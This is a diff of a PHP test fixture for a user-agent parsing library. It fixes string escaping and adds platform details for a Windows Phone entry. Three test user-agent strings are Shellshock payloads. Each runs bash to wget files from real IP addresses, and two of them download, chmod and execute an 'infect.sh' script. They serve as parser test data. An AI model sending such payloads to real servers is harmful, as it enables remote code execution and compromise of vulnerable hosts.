@@ -266,7 +266,7 @@ return [
         ],
     ],
     'test-0011-11' => [
-        'ua'         => '() { :; }; /bin/bash -c \'wget http://176.126.85.127:8080/megatron -O /dev/null\'',
+        'ua'         => '() { :; }; /bin/bash -c \\'wget http://176.126.85.127:8080/megatron -O /dev/null\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -1754,7 +1754,7 @@ return [
         ],
     ],
     'test-0011-74' => [
-        'ua'         => '() { :; }; /bin/bash -c \'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh\'',
+        'ua'         => '() { :; }; /bin/bash -c \\'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -2522,7 +2522,7 @@ return [
         ],
     ],
     'test-0011-106' => [
-        'ua'         => '() { :; }; /bin/bash -c \'echo radioactive.su; wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh &\'',
+        'ua'         => '() { :; }; /bin/bash -c \\'echo radioactive.su; wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh &\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -17699,6 +17699,9 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '0.0',
             'Platform_Name'           => 'Windows Phone OS',
+            'Platform_Version'        => '8.1.0',
+            'Platform_Bits'           => 32,
+            'Platform_Maker'          => 'Microsoft Corporation',
             'Device_Name'             => 'unknown',
             'Device_Maker'            => 'unknown',
             'Device_Type'             => 'unknown',
@@ -18767,7 +18770,7 @@ return [
         ],
     ],
     'test-0011-790' => [
-        'ua'         => 'Mozilla/5.0 (Linux; Android 4.4.2; T1-701u Build/\buaweiMediaPad) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
+        'ua'         => 'Mozilla/5.0 (Linux; Android 4.4.2; T1-701u Build/\\buaweiMediaPad) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
         'properties' => [
             'Browser_Name'            => 'Android WebView',
             'Browser_Type'            => 'Browser',
